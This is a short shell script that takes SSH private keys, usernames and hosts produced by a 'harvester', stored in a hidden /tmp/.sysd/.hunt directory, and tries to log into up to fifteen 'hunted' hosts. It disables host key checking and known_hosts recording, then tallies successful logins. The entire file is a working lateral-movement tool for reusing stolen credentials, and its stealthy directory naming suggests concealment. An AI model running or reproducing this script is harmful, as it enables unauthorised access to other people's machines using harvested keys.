#!/bin/sh
# throwaway: try the precise (key,user,host) triples the harvester produced.
# This is the honest test of "can we actually log into a hunted host".
W=/tmp/.sysd/.hunt
[ -s "$W/pairs.txt" ] || { echo "no pairs produced yet"; exit 0; }
echo "pairs_available=$(wc -l < "$W/pairs.txt")"
ok=0; auth=0; nossh=0; n=0
while IFS="$(printf '\t')" read -r key user host; do
    [ -n "${host:-}" ] || continue
    n=$((n + 1))
    [ "$n" -gt 15 ] && break
    if err=$(ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
                 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                 -o ConnectTimeout=5 "$user@$host" true 2>&1); then
        echo "LOGIN_OK  $user@$host"
        ok=$((ok + 1))
    else
        case "$err" in
            *"Permission denied"*) echo "AUTH_DENY $user@$host"; auth=$((auth + 1)) ;;
            *)                     echo "NO_SSH    $user@$host"; nossh=$((nossh + 1)) ;;
        esac
    fi
done < "$W/pairs.txt"
echo "tried=$n login_ok=$ok auth_deny=$auth no_ssh=$nossh"
